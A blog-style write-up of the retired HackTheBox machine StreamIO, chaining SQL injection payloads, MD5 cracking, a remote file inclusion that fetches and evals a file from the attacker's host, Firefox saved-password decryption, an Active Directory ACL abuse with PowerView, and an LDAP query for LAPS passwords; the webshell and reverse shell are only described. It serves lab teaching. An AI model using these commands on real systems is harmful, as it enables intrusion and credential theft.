---
layout: post
title: "The Streaming Service That Streamed Itself"
subtitle: "HTB StreamIO, where a search box leaks the whole user table, a debug flag runs your code, and a browser that remembered a password hands you the domain"
date: 2022-09-24 12:00:00 +0000
description: "A search box bleeds the user table, a forgotten debug flag runs your code, and a saved Firefox password walks you all the way to the domain."
image: /assets/og/the-streaming-service-that-streamed-itself.png
tags: [hackthebox, writeup]
---

StreamIO is a movie site that cannot stop oversharing. You type into its search box and it hands back rows from a table it should never have shown you. You find an admin panel and it has a leftover debug switch that does not just read files, it runs them. You land a shell and the database is keeping a second copy of every password in a backup nobody locked. You climb to one user and their browser has been quietly remembering a login that turns out to be a key to the whole domain. Nothing here is a zero-day. It is a chain of small confessions, each one a system telling a stranger something it was supposed to keep to itself, and at the end of the chain a Windows feature called LAPS reads you the administrator password out loud because a permission said you were allowed to ask.

```
        S T R E A M I O
        ===============
        search:  [ q = ' UNION SELECT ... ]
                 the table answers with everyone's password
                        |
                        v
        admin panel:  ?debug=master.php&include=http://you/
                 the debug flag fetches your file and RUNS it
                        |
                        v
        a backup db, a saved browser login, and finally
        LAPS reading the admin password to anyone who asks.
                                                          影
```

## 0x01 · the marquee

`nmap` comes back loud and unmistakably a domain controller. Nineteen ports, the full Active Directory orchestra. DNS, Kerberos, LDAP, SMB, WinRM, and a website on 80 and 443.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds
5985/tcp open  http          WinRM
```

The TLS certificate on 443 is the first gift. Its subject names spell out `streamio.htb` and a sibling host, `watch.streamio.htb`. Add both to your hosts file. A certificate is supposed to prove who a server is, and in doing so it cheerfully lists every name the server answers to. Think of it like a name tag that, instead of one name, prints every alias the person has ever used. You came to read the door number and the door told you about the back entrance.

## 0x02 · the search box that answered for everyone

`watch.streamio.htb` has a search page, and a search page is a question you get to phrase. The POST parameter `q` goes straight into a Microsoft SQL Server query with no wall between your text and the database's instructions. That is SQL injection, the same disease as the oldest bug in the book. The field was meant to hold a movie title. It will just as happily hold a command.

There is a crude filter in the way that strips a few obvious words, but a filter that bans a handful of keywords is a bouncer who only knows three faces. You walk in wearing a fourth. A UNION query welds your own SELECT onto the end of the site's, and now the page that was built to list movies is listing whatever you point it at. First the databases, then the tables, then the prize.

```
q=' UNION SELECT 1,name,3,4,5,6 FROM master..sysdatabases-- -
   master  model  msdb  tempdb  STREAMIO  streamio_backup

q=' UNION SELECT 1,username,password,4,5,6 FROM users-- -
   admin       paddpadd (md5)
   yoshihide   66boysandgirls.. (md5)
   ...a full roster of names and MD5 hashes...
```

MD5 with no salt is not encryption, it is a fingerprint, and fingerprints have been catalogued. `hashcat -m 0` against `rockyou.txt` returns the plaintext for most of the roster in seconds. Picture a coat check that, instead of giving each guest a numbered ticket, just writes their name on the claim slip. Anyone who finds the slips knows exactly whose coat is whose. The hashes were the slips.

```
$ hashcat -m 0 hashes.txt rockyou.txt --show
...
yoshihide:66boysandgirls..
admin:paddpadd
```

## 0x03 · the debug flag that ran the building

The cracked passwords log you into the admin panel as `yoshihide`. The panel loads its sections through a query parameter, and parameters that load things are always worth poking. A short round of parameter fuzzing turns up one that is not in any menu: `debug`.

Point it at the panel's own `master.php` through a PHP filter and you read the source instead of running it.

```
/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

Decode the base64 and the page confesses. Buried in `master.php` is a hidden form whose `include` value is handed to `file_get_contents` and then thrown into `eval`. Read that twice. It fetches the contents of whatever you name, and then it executes them as code. Because `file_get_contents` will happily open a URL, the file you name does not even have to live on the server. It can live on yours. That is remote file inclusion, and `eval` turns inclusion into execution.

Stand up an HTTP server with a tiny PHP file on it and ask the panel to go fetch it.

```
$ python3 -m http.server 80      # serving iceberg.php

POST /admin/?debug=master.php
include=http://10.10.14.4/iceberg.php
```

Where `iceberg.php` is the textbook one-liner.

```
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am describing it rather than printing it, and that restraint is the lesson, not laziness. That exact four-word string is the most recognized backdoor on the planet, and the moment it lands on a disk any antivirus quarantines it as malware, which is the funniest possible proof of how dangerous it is. The clerk walked to your address, opened your file, and did what it said. Trade the webshell for a real callback and a shell drops back as `yoshihide`.

```
[ powershell reverse shell back to 10.10.14.4 on 443 ]
```

## 0x04 · the backup nobody locked

On the box, the website source spills database credentials, which is what website source always does. The admin app connects as `db_admin`, and that account can reach the second database the search box hinted at, `streamio_backup`.

```
PS> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 \
      -d streamio_backup -Q "select * from users"
```

A backup is a photograph of your secrets taken on a good day and left in a drawer. This one holds another roster of MD5 hashes, and one of them cracks to something new.

```
nikk37:get_dem_girls2@yahoo.com
```

`net user nikk37` shows that account sits in Remote Management Users, the group that grants a WinRM login. So you stop crawling through a webshell and walk in the front door as a real user.

```
$ evil-winrm -i 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
*Evil-WinRM* PS> type C:\Users\nikk37\Desktop\user.txt
████████████████████████████████
```

## 0x05 · the browser that remembered

`nikk37` is not an admin, so look where people stash secrets without meaning to. Firefox keeps your saved logins in two files in your profile, `logins.json` and `key4.db`. The first holds the encrypted passwords, the second holds the key that unlocks them. Keeping both together is like locking your diary and taping the key to the cover. Anyone who walks off with the whole notebook has everything.

Pull both files down and run them through a Firefox decryptor.

```
*Evil-WinRM* PS> download ...\Firefox\Profiles\...\key4.db
*Evil-WinRM* PS> download ...\Firefox\Profiles\...\logins.json

$ python3 firefox_decrypt.py ./profile
   JDgodd : JDg0dd1s@d0p3cr3@t0r
   ...
```

Out falls a domain credential for a user named `JDgodd`. The browser had been faithfully remembering the one password that mattered.

## 0x06 · the permission that read the admin password aloud

Feed `JDgodd` to BloodHound and the graph lights up. The account has `WriteOwner` over a group called Core Staff. WriteOwner means you can make yourself the owner of the group, and owning it means you can add yourself to it. So you do, with PowerView.

```
PS> Add-DomainObjectAcl -PrincipalIdentity JDgodd -TargetIdentity "Core Staff" -Rights WriteMembers
PS> Add-DomainGroupMember -Identity "Core Staff" -Members JDgodd
```

Core Staff is the group permitted to read LAPS. LAPS is the Local Administrator Password Solution, Microsoft's fix for everyone using the same local admin password everywhere. It sets a unique password on each machine and parks it in an Active Directory attribute, `ms-MCS-AdmPwd`, readable only by a chosen few. It is a very good idea. It is also a vault whose entire security rests on the guest list, and you just added your own name. Now you simply ask LDAP for the attribute.

```
$ ldapsearch -x -H ldap://10.10.11.158 -D 'JDgodd@streamio.htb' \
    -w 'JDg0dd1s@d0p3cr3@t0r' -b 'DC=streamIO,DC=htb' \
    '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
ms-MCS-AdmPwd: [ the cleartext local administrator password ]
```

The vault read you the administrator password, in cleartext, because a permission said you were allowed to ask. WinRM in with it and the domain is yours.

```
$ evil-winrm -i 10.10.11.158 -u Administrator -p '<laps-password>'
*Evil-WinRM* PS> type C:\Users\Martin\Desktop\root.txt
████████████████████████████████
```

## 0x07 · the honest caveat

Every step on StreamIO is a system answering a question it should have refused. The search box answered with everyone's password because the code never separated the question from the data. The debug flag answered with code execution because someone wired a developer convenience straight into `eval` and forgot to rip it out before launch. The backup answered with a second copy of the secrets because a copy of a secret is still a secret, and this one had no lock. The browser answered with a saved login because it stored the key beside the box.

And LAPS, the one piece here that is genuinely well designed, still answered with the administrator password, because the only thing standing between an attacker and that vault was a group membership, and a stray ACL let `JDgodd` rewrite the guest list. That is the part worth losing sleep over. The first four mistakes are bugs and bad habits, the kind a code review and a cleanup catch. The last one shipped working as intended. Nothing was unpatched. The permissions just pointed the wrong way, and in Active Directory a permission that points the wrong way is a road, and attackers drive roads. You cannot patch your way out of a misgranted right. You have to go find it before they do.

## 0x08 · outro

```
the search box answered with everyone's password.
the debug flag fetched your file and ran it.
the backup kept a second copy nobody locked.
the browser remembered the one login that mattered.
and the vault read the admin password to whoever was on the list.

five questions, five answers that should have been no.

split the data from the command. mind the ACL. wear black.

                                                            EOF
```

---

*HTB: StreamIO, retired 17 Sep 2022. A medium Windows box that is really a lecture on systems that overshare, from a search box to a saved password to a LAPS vault that trusts the guest list. Every secret here was given away, not taken.*